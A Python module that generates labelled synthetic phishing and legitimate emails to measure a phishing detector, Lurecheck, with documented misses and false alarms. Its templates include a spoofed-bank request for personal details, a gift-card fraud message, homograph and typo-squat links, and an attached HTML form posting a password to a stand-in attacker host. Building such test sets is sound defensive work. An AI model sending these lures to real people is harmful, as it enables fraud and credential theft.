"""Labelled, made-up emails, for measuring Lurecheck.

Each scenario writes one kind of message, with details drawn at random from a
seeded generator: names, subjects, dates, addresses and wording vary, the trick
does not. Every message carries its label (phishing or legitimate), so a run
over many of them says how often the tool gets each kind right.

Two kinds of scenario are there to keep the numbers honest:

* **documented misses**: phishing that Lurecheck is *not* expected to catch,
  because nothing in it is a technical tell (a plain request from a free mail
  account) or because it relies on something not checked yet (an attachment).
* **documented false alarms**: legitimate mail that it is expected to flag,
  because it looks exactly like a trick (a newsletter's click tracking, a help
  desk's reply address, a mailing list that breaks signatures).

Scoring only the scenarios a tool handles would measure nothing. Leaving these
in, labelled, is what makes the results worth reading.

Everything is invented: ``.example`` and ``.test`` names, documentation address
ranges, and three real service names Lurecheck recognises (a link shortener and
two mail security rewriters). The reader is ``alex@harbor-mail.example``, whose
own bank is ``northwind-bank.example``; runs protect that domain, as a reader
would protect their own organisation's.
"""
from __future__ import annotations

import random
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from email.utils import format_datetime
from typing import Callable, Dict, List, Optional, Sequence, Tuple

PHISH, BENIGN = "phish", "benign"
RECIPIENT = "alex@harbor-mail.example"
SERVER = "mx.harbor-mail.example"
PROTECTED = ("northwind-bank.example",)
BANK = ("Northwind Bank", "northwind-bank.example")

FIRST = ("Alex", "Sam", "Priya", "Jordan", "Mei", "Tom", "Aisha", "Luca", "Grace", "Omar", "Hana", "Ben")
LAST = ("Rivera", "Okafor", "Nair", "Chen", "Walsh", "Haddad", "Rossi", "Kim", "Novak", "Silva")
COMPANIES = (
    ("Fabrikam Outdoor", "fabrikam-outdoor.example"),
    ("Contoso Books", "contoso-books.example"),
    ("Tailspin Travel", "tailspin-travel.example"),
    ("Litware Software", "litware.example"),
    ("Adatum Health", "adatum-health.example"),
    BANK,
)
WORDS = ("secure", "verify", "account", "login", "update", "portal", "alerts", "support", "billing", "service", "notice", "access")
ESP = "sendwell.example"  # a made-up bulk mail service
FREEMAIL = "freemail.example"
# Real brands imitated with a one-letter change, as they appear in the wild (names of six letters or more).
TYPOS = (("PayPal", "paypall"), ("Microsoft account team", "micorsoft"), ("LinkedIn", "linkedln"),
         ("Dropbox", "dropbx"), ("Netflix", "netfllix"))  # fmt: skip
# Real brands imitated with a letter from another alphabet: (name shown, brand label, position, code point).
HOMOGRAPHS = (("PayPal", "paypal", 1, 0x430), ("Microsoft account team", "microsoft", 1, 0x456),
              ("Apple Support", "apple", 0, 0x430), ("Netflix", "netflix", 1, 0x435))  # fmt: skip


@dataclass(frozen=True)
class Scenario:
    name: str
    label: str  # PHISH or BENIGN
    description: str
    documented: str = ""  # why Lurecheck is expected to get this one wrong; "" if it should get it right
    write: Callable[[random.Random], bytes] = lambda rnd: b""

    @property
    def expected_flag(self) -> bool:
        """What Lurecheck is expected to do: flag phishing, leave legitimate mail alone, except where documented."""
        return (self.label == PHISH) != bool(self.documented)


@dataclass(frozen=True)
class Sample:
    scenario: Scenario
    data: bytes
    seed: int


# --- building blocks -------------------------------------------------------------------------


def _ip(rnd: random.Random) -> str:
    return f"{rnd.choice(('192.0.2', '198.51.100', '203.0.113'))}.{rnd.randint(1, 254)}"


def _person(rnd: random.Random) -> Tuple[str, str]:
    first, last = rnd.choice(FIRST), rnd.choice(LAST)
    return f"{first} {last}", f"{first}.{last}".lower()


def _attacker_domain(rnd: random.Random) -> str:
    first, second = rnd.sample(WORDS, 2)
    return f"{first}-{second}-{rnd.randint(10, 99)}.example"


def _homograph(rnd: random.Random) -> Tuple[str, str]:
    """(name shown, a host whose name imitates the brand with one foreign letter)."""
    shown, label, position, code = rnd.choice(HOMOGRAPHS)
    fake = label[:position] + chr(code) + label[position + 1 :]
    return shown, f"{rnd.choice(('login', 'account', 'secure'))}.xn--{fake.encode('punycode').decode('ascii')}.example"


def _auth(rnd: random.Random, *, dmarc: str, spf: str, dkim: str, mailfrom: str, dkim_domain: str, from_domain: str) -> str:
    parts = [f"spf={spf} smtp.mailfrom={mailfrom}"]
    parts.append(f"dkim={dkim} header.d={dkim_domain}" if dkim != "none" else "dkim=none")
    parts.append(f"dmarc={dmarc} header.from={from_domain}")
    return f"{SERVER};\n       " + ";\n       ".join(parts)


def _html(*paragraphs: str) -> str:
    return "<html><body>\n" + "\n".join(f"<p>{p}</p>" for p in paragraphs) + "\n</body></html>\n"


def _message(
    rnd: random.Random,
    *,
    sender: str,
    subject: str,
    auth: str,
    mailfrom: str,
    text: Optional[str] = None,
    html: Optional[str] = None,
    extra: Sequence[Tuple[str, str]] = (),
    attachment: Optional[Tuple[str, str, str]] = None,
) -> bytes:
    """A whole message. ``attachment`` is (file name, content type, content)."""
    when = datetime(2026, 10, 1, tzinfo=timezone.utc) + timedelta(minutes=rnd.randint(0, 40_000))
    relay = _ip(rnd)
    headers = [
        ("Delivered-To", RECIPIENT),
        ("Received", f"by {SERVER} with SMTP id {rnd.randint(10**8, 10**9)} for <{RECIPIENT}>;\n        {format_datetime(when)}"),
        ("Return-Path", f"<{mailfrom}>"),
        ("Authentication-Results", auth),
        ("Received", f"from relay.{mailfrom.rsplit('@', 1)[-1]} ([{relay}])\n        by {SERVER} with ESMTPS; {format_datetime(when)}"),
        ("From", sender),
        *extra,
        ("To", RECIPIENT),
        ("Subject", subject),
        ("Date", format_datetime(when - timedelta(seconds=rnd.randint(2, 30)))),
        ("Message-ID", f"<{rnd.randint(10**9, 10**10)}@{mailfrom.rsplit('@', 1)[-1]}>"),
        ("MIME-Version", "1.0"),
    ]
    boundary = f"b{rnd.randint(10**6, 10**7)}"
    parts: List[str] = []
    if text is not None:
        parts.append(f'Content-Type: text/plain; charset="utf-8"\n\n{text}')
    if html is not None:
        parts.append(f'Content-Type: text/html; charset="utf-8"\n\n{html}')
    if len(parts) > 1:
        body_type, body = f'multipart/alternative; boundary="{boundary}a"', "".join(f"--{boundary}a\n{p}\n" for p in parts) + f"--{boundary}a--\n"
    else:
        body_type, body = parts[0].split("\n\n", 1)[0][len("Content-Type: "):], parts[0].split("\n\n", 1)[1]
    if attachment:
        name, kind, content = attachment
        inner = f"Content-Type: {body_type}\n\n{body}"
        attached = f'Content-Type: {kind}; name="{name}"\nContent-Disposition: attachment; filename="{name}"\n\n{content}'
        body_type = f'multipart/mixed; boundary="{boundary}m"'
        body = f"--{boundary}m\n{inner}\n--{boundary}m\n{attached}\n--{boundary}m--\n"
    headers.append(("Content-Type", body_type))
    return ("\n".join(f"{name}: {value}" for name, value in headers) + "\n\n" + body).encode("utf-8")


def _pass(rnd: random.Random, domain: str, mailfrom: str) -> str:
    return _auth(rnd, dmarc="pass", spf="pass", dkim="pass", mailfrom=mailfrom, dkim_domain=domain, from_domain=domain)


# --- phishing ----------------------------------------------------------------------------------


def spoofed_bank(rnd: random.Random) -> bytes:
    host = f"vps{rnd.randint(1, 99)}.cheap-host.example"
    return _message(
        rnd, sender=f'"{BANK[0]} Security" <security@{BANK[1]}>', mailfrom=f"mailer@{host}",
        subject=rnd.choice(("Unusual sign-in: confirm your identity", "Your account will be suspended", "Security alert on your account")),
        auth=_auth(rnd, dmarc="fail", spf=rnd.choice(("fail", "softfail")), dkim="none", mailfrom=f"mailer@{host}",
                   dkim_domain=host, from_domain=BANK[1]),
        extra=[("Reply-To", f"verification@{_attacker_domain(rnd)}")],
        text="Dear customer,\n\nTo avoid suspension, reply with your customer number and date of birth.\n",
    )  # fmt: skip


def display_name_address(rnd: random.Random) -> bytes:
    domain = _attacker_domain(rnd)
    return _message(
        rnd, sender=f'"accounts@{BANK[1]}" <billing@{domain}>', mailfrom=f"billing@{domain}",
        subject=f"Invoice {rnd.randint(10000, 99999)} is overdue", auth=_pass(rnd, domain, f"billing@{domain}"),
        text="Your invoice is overdue. Reply today to avoid a late fee.\n",
    )  # fmt: skip


def deceptive_link(rnd: random.Random) -> bytes:
    domain = f"{BANK[1].split('.')[0]}-{rnd.choice(WORDS)}.example"
    target = f"https://{rnd.choice((BANK[1] + '.', ''))}{_attacker_domain(rnd)}/login?id={rnd.randint(1000, 9999)}"
    return _message(
        rnd, sender=f"{BANK[0]} <service@{domain}>", mailfrom=f"service@{domain}",
        subject=rnd.choice(("Action required: verify your account", "Confirm your details", "Your statement is ready")),
        auth=_pass(rnd, domain, f"service@{domain}"),
        html=_html("We could not verify your details. Sign in to keep your account active:",
                   f'<a href="{target}">https://{BANK[1]}/login</a>'),
    )  # fmt: skip


def homograph_link(rnd: random.Random) -> bytes:
    shown, host = _homograph(rnd)
    domain = f"{rnd.choice(WORDS)}-notices.example"
    return _message(
        rnd, sender=f"{shown} <no-reply@{domain}>", mailfrom=f"no-reply@{domain}",
        subject=rnd.choice(("Unusual sign-in activity", "Your payment could not be processed", "Verify your account")),
        auth=_pass(rnd, domain, f"no-reply@{domain}"),
        html=_html("We noticed something unusual on your account.", f'<a href="https://{host}/review">Review recent activity</a>'),
    )  # fmt: skip


def name_before_at(rnd: random.Random) -> bytes:
    domain = f"parcel-{rnd.choice(WORDS)}.example"
    return _message(
        rnd, sender=f"Parcel Desk <notice@{domain}>", mailfrom=f"notice@{domain}",
        subject="Your parcel could not be delivered", auth=_pass(rnd, domain, f"notice@{domain}"),
        html=_html("Your parcel is being held.", f'<a href="https://{BANK[1]}@{_ip(rnd)}/reschedule">Reschedule delivery</a>'),
    )  # fmt: skip


def ip_link(rnd: random.Random) -> bytes:
    domain = _attacker_domain(rnd)
    return _message(
        rnd, sender=f"IT Service Desk <helpdesk@{domain}>", mailfrom=f"helpdesk@{domain}",
        subject="Your mailbox is almost full", auth=_pass(rnd, domain, f"helpdesk@{domain}"),
        html=_html("Your mailbox has reached 98% of its limit.", f'<a href="http://{_ip(rnd)}/mailbox/upgrade">Increase storage</a>'),
    )  # fmt: skip


def typo_sender(rnd: random.Random) -> bytes:
    shown, typo = rnd.choice(TYPOS)
    domain = f"{typo}.example"
    return _message(
        rnd, sender=f"{shown} <service@{domain}>", mailfrom=f"service@{domain}",
        subject=rnd.choice(("Your account has been limited", "Action needed on your account", "Payment declined")),
        auth=_pass(rnd, domain, f"service@{domain}"),
        html=_html("We need you to confirm some details.", f'<a href="https://{domain}/confirm">Confirm now</a>'),
    )  # fmt: skip


def shortened_link(rnd: random.Random) -> bytes:
    domain = f"parcel-{rnd.choice(WORDS)}.example"
    return _message(
        rnd, sender=f"Parcel Desk <notice@{domain}>", mailfrom=f"notice@{domain}",
        subject="A small redelivery fee is due", auth=_pass(rnd, domain, f"notice@{domain}"),
        html=_html("Pay the redelivery fee to receive your parcel.", f'<a href="https://bit.ly/{rnd.randint(10**5, 10**6)}x">Pay now</a>'),
    )  # fmt: skip


def plain_phish(rnd: random.Random) -> bytes:
    domain = f"{rnd.choice(('docs', 'files', 'share'))}-{rnd.choice(('portal', 'hub', 'cloud'))}-{rnd.randint(10, 99)}.example"
    return _message(
        rnd, sender=f"Document Share <share@{domain}>", mailfrom=f"share@{domain}",
        subject="A document has been shared with you", auth=_pass(rnd, domain, f"share@{domain}"),
        html=_html("A colleague shared a document with you.", f'<a href="https://{domain}/view/{rnd.randint(10**5, 10**6)}">Open document</a>'),
    )  # fmt: skip


def gift_card_request(rnd: random.Random) -> bytes:
    name, local = _person(rnd)
    return _message(
        rnd, sender=f"{name} <{local}.office@{FREEMAIL}>", mailfrom=f"{local}.office@{FREEMAIL}",
        subject=rnd.choice(("Quick favour", "Are you at your desk?", "Need this today")),
        auth=_pass(rnd, FREEMAIL, f"{local}.office@{FREEMAIL}"),
        text=f"Hi,\n\nI'm in meetings all day. Can you buy six gift cards for a client and send me the codes?\n\n{name.split()[0]}\n",
    )  # fmt: skip


def html_attachment(rnd: random.Random) -> bytes:
    domain = _attacker_domain(rnd)
    page = f'<html><body><form action="https://{_attacker_domain(rnd)}/collect" method="post">Password <input type="password"></form></body></html>'
    return _message(
        rnd, sender=f"Accounts <accounts@{domain}>", mailfrom=f"accounts@{domain}",
        subject=f"Remittance advice {rnd.randint(1000, 9999)}", auth=_pass(rnd, domain, f"accounts@{domain}"),
        text="Please find the remittance advice attached.\n",
        attachment=(f"Remittance_{rnd.randint(1000, 9999)}.html", "text/html", page),
    )  # fmt: skip


# --- legitimate mail ---------------------------------------------------------------------------


def newsletter(rnd: random.Random) -> bytes:
    company, domain = rnd.choice(COMPANIES)
    bounce = f"bounce-{rnd.randint(100, 999)}@bounces.{ESP}"
    return _message(
        rnd, sender=f"{company} <news@{domain}>", mailfrom=bounce, subject=f"{company}: what's new this month",
        auth=_auth(rnd, dmarc="pass", spf="pass", dkim="pass", mailfrom=bounce, dkim_domain=domain, from_domain=domain),
        text=f"Hello, here is the latest from {company}: https://www.{domain}/new\n",
        html=_html(f"Hello, here is the latest from {company}.",
                   f'<a href="https://www.{domain}/new">See what\'s new</a> or <a href="https://www.{domain}/account">manage your account</a>.',
                   f'Visit <a href="https://www.{domain}/">www.{domain}</a>.'),
    )  # fmt: skip


def tracked_newsletter(rnd: random.Random) -> bytes:
    company, domain = rnd.choice(COMPANIES)
    bounce = f"bounce-{rnd.randint(100, 999)}@bounces.{ESP}"
    track = f"https://click.{ESP}/ls/click?upn={rnd.randint(10**8, 10**9)}"
    return _message(
        rnd, sender=f"{company} <news@{domain}>", mailfrom=bounce, subject=f"{company}: offers for you",
        auth=_auth(rnd, dmarc="pass", spf="pass", dkim="pass", mailfrom=bounce, dkim_domain=domain, from_domain=domain),
        html=_html(f"Hello, here are this month's offers from {company}.", f'<a href="{track}">Shop the offers</a>',
                   f'Visit <a href="{track}2">www.{domain}</a>.'),
    )  # fmt: skip


def rewritten_receipt(rnd: random.Random) -> bytes:
    company, domain = rnd.choice(COMPANIES)
    target = f"https%3A%2F%2Fwww.{domain}%2Forders%2F{rnd.randint(10**5, 10**6)}"
    return _message(
        rnd, sender=f"{company} <orders@{domain}>", mailfrom=f"orders@{domain}", subject=f"Your {company} order",
        auth=_pass(rnd, domain, f"orders@{domain}"),
        html=_html("Thanks for your order.",
                   f'<a href="https://nam01.safelinks.protection.outlook.com/?url={target}&amp;data=05">View your order</a>'),
    )  # fmt: skip


def personal(rnd: random.Random) -> bytes:
    name, local = _person(rnd)
    return _message(
        rnd, sender=f"{name} <{local}@{FREEMAIL}>", mailfrom=f"{local}@{FREEMAIL}",
        subject=rnd.choice(("Weekend plans", "Photos from Saturday", "That article")),
        auth=_pass(rnd, FREEMAIL, f"{local}@{FREEMAIL}"),
        text=f"Hi Alex,\n\nThought you'd like this: https://news.tailspin-travel.example/story/{rnd.randint(100, 999)}\n\n{name.split()[0]}\n",
    )  # fmt: skip


def international(rnd: random.Random) -> bytes:
    shown, label = rnd.choice((("Müller Werkzeuge", "müller-werkzeuge"), ("Café Lumière", "café-lumière"),
                               ("Örn Fiskeri", "örn-fiskeri")))  # fmt: skip
    domain = f"xn--{label.encode('punycode').decode('ascii')}.example"
    return _message(
        rnd, sender=f"{shown} <info@{domain}>", mailfrom=f"info@{domain}", subject="Your appointment is confirmed",
        auth=_pass(rnd, domain, f"info@{domain}"),
        html=_html("Your appointment is confirmed.", f'<a href="https://{domain}/appointments">Manage it here</a>'),
    )  # fmt: skip


def second_domain(rnd: random.Random) -> bytes:
    # The bank also mails from a second name it owns, which nothing tells Lurecheck about.
    domain = "northwind-bank.test"
    return _message(
        rnd, sender=f"{BANK[0]} <news@{domain}>", mailfrom=f"news@{domain}", subject="Changes to our opening hours",
        auth=_pass(rnd, domain, f"news@{domain}"),
        html=_html("Our branches have new opening hours from November.", f'<a href="https://www.{domain}/hours">See the new hours</a>'),
    )  # fmt: skip


def help_desk(rnd: random.Random) -> bytes:
    company, domain = rnd.choice(COMPANIES[:5])
    ticket = rnd.randint(1000, 9999)
    return _message(
        rnd, sender=f"{company} Support <support@{domain}>", mailfrom=f"support@{domain}",
        subject=f"[Ticket #{ticket}] We've received your request", auth=_pass(rnd, domain, f"support@{domain}"),
        extra=[("Reply-To", f"support+{ticket}@{domain.split('.')[0]}.helpdesk-cloud.example")],
        text=f"Thanks for contacting {company}. Reply to this message to add to ticket #{ticket}.\n",
    )  # fmt: skip


def mailing_list(rnd: random.Random) -> bytes:
    name, local = _person(rnd)
    company, domain = rnd.choice(COMPANIES[:5])
    listserver = "lists.harbor-mail.example"
    return _message(
        rnd, sender=f"{name} <{local}@{domain}>", mailfrom=f"club-bounces@{listserver}",
        subject="[Gardening Club] Seed swap on Saturday",
        auth=_auth(rnd, dmarc="fail", spf="pass", dkim="fail", mailfrom=f"club-bounces@{listserver}", dkim_domain=domain, from_domain=domain),
        extra=[("List-Id", f"Gardening Club <club.{listserver}>")],
        text=f"Bring spare seeds on Saturday!\n\n{name.split()[0]}\n\n--\nYou are subscribed to the Gardening Club list.\n",
    )  # fmt: skip


SCENARIOS: Tuple[Scenario, ...] = (
    Scenario("spoofed-bank", PHISH, "Claims to be the reader's bank from its real address; fails DMARC; replies go elsewhere", write=spoofed_bank),
    Scenario("display-name-address", PHISH, "The sender's name is the bank's address; the real one is the attacker's", write=display_name_address),
    Scenario("deceptive-link", PHISH, "From a bank-plus-words domain; the link shows the bank's address and goes elsewhere", write=deceptive_link),
    Scenario("homograph-link", PHISH, "Claims to be a well-known brand; the link's domain swaps in a letter from another alphabet", write=homograph_link),
    Scenario("name-before-at", PHISH, "A link with the bank's name before an @ and a numeric address after it", write=name_before_at),
    Scenario("ip-link", PHISH, "A link to a bare numeric address", write=ip_link),
    Scenario("typo-sender", PHISH, "From a domain one letter away from a well-known brand's", write=typo_sender),
    Scenario("shortened-link", PHISH, "A single shortened link from an unremarkable domain", write=shortened_link,
             documented="A shortener alone scores 10. Where it leads cannot be known without following it, which Lurecheck never does."),
    Scenario("plain-phish", PHISH, "From the attacker's own clean domain, passing every check, with a link to that same domain", write=plain_phish,
             documented="Nothing in it is a technical tell. Only the wording, or the reputation of a brand-new domain, gives it away."),
    Scenario("gift-card-request", PHISH, "A request for gift cards from a free mail account, with no links", write=gift_card_request,
             documented="Business email compromise of this kind is all social engineering. Lurecheck does not judge the wording."),
    Scenario("html-attachment", PHISH, "A login form sent as an attached HTML file", write=html_attachment,
             documented="Attachments are not examined until stage 5."),
    Scenario("newsletter", BENIGN, "A company's newsletter sent through a bulk mail service, links to its own site", write=newsletter),
    Scenario("rewritten-receipt", BENIGN, "An order receipt whose link was rewritten by a mail security service", write=rewritten_receipt),
    Scenario("personal", BENIGN, "A friend writing from a free mail account, with a link to a news story", write=personal),
    Scenario("international", BENIGN, "A small business whose name uses non-English letters", write=international),
    Scenario("second-domain", BENIGN, "The reader's bank mailing from a second domain it owns", write=second_domain),
    Scenario("tracked-newsletter", BENIGN, "A newsletter whose links go through click tracking, one showing the company's address", write=tracked_newsletter,
             documented="Click tracking makes a link's text name one site and its address another, exactly like a deceptive link."),
    Scenario("help-desk", BENIGN, "A support ticket whose replies go to a help-desk service's domain", write=help_desk,
             documented="Replies going to another organisation is how a forged sender gets answers, and how help-desk services work."),
    Scenario("mailing-list", BENIGN, "A mailing list that adds a footer, breaking the author's signature", write=mailing_list,
             documented="The list changes the message, so DMARC fails for the author's domain, as it would for a forgery."),
)  # fmt: skip


def generate(seeds: Sequence[int], scenarios: Sequence[Scenario] = SCENARIOS) -> List[Sample]:
    """One message per scenario per seed. The same seeds always give the same messages."""
    samples = []
    for seed in seeds:
        for index, scenario in enumerate(scenarios):
            rnd = random.Random(seed * 1000 + index)
            samples.append(Sample(scenario=scenario, data=scenario.write(rnd), seed=seed))
    return samples


def by_name() -> Dict[str, Scenario]:
    return {scenario.name: scenario for scenario in SCENARIOS}
